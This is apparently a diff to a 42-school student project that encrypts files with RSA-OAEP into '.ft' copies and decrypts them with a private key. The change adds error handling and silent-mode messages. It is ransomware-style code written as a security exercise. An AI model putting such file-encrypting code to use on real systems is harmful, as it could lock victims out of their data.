@@ -6,7 +6,7 @@
 #    By: guferrei <guferrei@student.42sp.org.br>    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2025/02/14 21:33:17 by guferrei          #+#    #+#              #
-#    Updated: 2025/02/18 15:47:45 by guferrei         ###   ########.fr        #
+#    Updated: 2025/02/18 16:03:28 by guferrei         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -56,14 +56,17 @@ def encrypt(file, public_key, args):
 	plaintext = load_file_content(file)
 
 	if plaintext:
-		ciphertext = public_key.encrypt(
-			plaintext,
-			padding.OAEP(
-				mgf=padding.MGF1(algorithm=hashes.SHA256()),
-				algorithm=hashes.SHA256(),
-				label=None
+		try:
+			ciphertext = public_key.encrypt(
+				plaintext,
+				padding.OAEP(
+					mgf=padding.MGF1(algorithm=hashes.SHA256()),
+					algorithm=hashes.SHA256(),
+					label=None
+				)
 			)
-		)
+		except:
+			raise Exception()
 
 		with open(file+'.ft', 'wb') as f:
 			f.write(ciphertext)
@@ -73,21 +76,24 @@ def encrypt(file, public_key, args):
 def decrypt(file, private_key):
 	ciphertext = load_file_content(file)
 	if ciphertext:
-		plaintext = private_key.decrypt(
-			ciphertext,
-			padding.OAEP(
-				mgf=padding.MGF1(algorithm=hashes.SHA256()),
-				algorithm=hashes.SHA256(),
-				label=None
+		try:
+			plaintext = private_key.decrypt(
+				ciphertext,
+				padding.OAEP(
+					mgf=padding.MGF1(algorithm=hashes.SHA256()),
+					algorithm=hashes.SHA256(),
+					label=None
+				)
 			)
-		)
+		except:
+			raise Exception
 
 		with open(file.removesuffix('.ft'), 'wb') as f:
 			f.write(plaintext)
 		os.remove(file)
 
 
-def reverse(key: str):
+def reverse(key: str, args):
 	file_list = get_files("/**/*.ft")
 	try:
 		private_key = serialization.load_pem_private_key(key.encode(), password=None)
@@ -96,8 +102,14 @@ def reverse(key: str):
 		return
 
 	for file in file_list:
-		decrypt(file, private_key)
-	print("Decryption Successful")
+		try:
+			decrypt(file, private_key)
+		except:
+			if not args.silent:
+				print("File Decryption Failed! This is not the right private key")
+			return
+	if not args.silent:
+		print("Decryption Successful")
 
 
 def run(args):
@@ -110,7 +122,14 @@ def run(args):
 		return
 
 	for file in file_list:
-		encrypt(file, public_key, args)
+		try:
+			encrypt(file, public_key, args)
+		except:
+			if not args.silent:
+				print("File Encryption Failed! Make sure you are using an RSA public key of at least 1024 bits")
+			return
+	if not args.silent:
+		print("Encryption Successful")
 
 
 def main():
@@ -118,7 +137,7 @@ def main():
 	if args.version:
 		print_version()
 	if args.reverse:
-		reverse(args.reverse)
+		reverse(args.reverse, args)
 		return
 	run(args)
 
